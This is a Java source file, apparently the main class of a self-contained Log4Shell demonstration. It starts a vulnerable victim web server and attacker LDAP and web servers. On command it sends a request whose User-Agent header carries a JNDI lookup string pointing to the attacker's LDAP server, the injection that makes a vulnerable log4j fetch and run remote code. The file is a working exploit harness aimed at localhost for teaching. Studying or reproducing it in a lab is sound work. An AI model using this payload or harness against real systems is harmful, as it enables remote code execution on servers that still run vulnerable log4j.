package de.apwolf.log4shell;

import com.unboundid.ldap.sdk.LDAPException;
import de.apwolf.log4shell.attacker.AttackerLdapServer;
import de.apwolf.log4shell.attacker.AttackerWebServer;
import de.apwolf.log4shell.victim.VictimWebServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

/**
 * The composition class - here, the attacker and victim services are booted up and you can perform the attack.
 */
public class Main {

    private static final Logger LOGGER = LogManager.getLogger();

    private static final String ATTACK_STRING = "${jndi:ldap://127.0.0.1:1389/Attack}";

    public static void main(String[] args) throws IOException, LDAPException {
        LOGGER.info("${java:version} - if this string does not show your Java version, property substitution in your" +
                "log4j setup is disabled! Check your Java version!");

        new VictimWebServer().start();

        new AttackerLdapServer().start();
        new AttackerWebServer().start();

        LOGGER.info("It might be that the JVM process hangs after getting pwned because Sun's HttpServer simple mind " +
                "cannot cope with getting shot in the head. In this case, please just stop the process by hand.");
        LOGGER.info("Type 'a' to attack or 'q' to quit... and press enter to confirm:");
        readInput();

    }

    private static void readInput() {
        Scanner scanner = new Scanner(System.in);
        switch (scanner.nextLine()) {
            case "a":
                LOGGER.info("Attacking...");
                attack();
                break;
            case "q":
                LOGGER.info("Quitting...");
                System.exit(0);
                break;
            default:
                LOGGER.warn("What?");
                readInput();
        }
    }

    private static void attack() {
        try {
            URL url = new URL("http://localhost:" + VictimWebServer.PORT);
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestProperty("User-Agent", ATTACK_STRING);
            con.setRequestMethod("GET");
            con.setReadTimeout(2000);
            con.setConnectTimeout(2000);
            con.getResponseCode();
        } catch (Exception e) {
            LOGGER.warn("Timeout when attacking happened - this is probably ok because you just killed the victim service. " +
                    "Otherwise the victim service was not available from the start and you should investigate.");
        }
    }
}
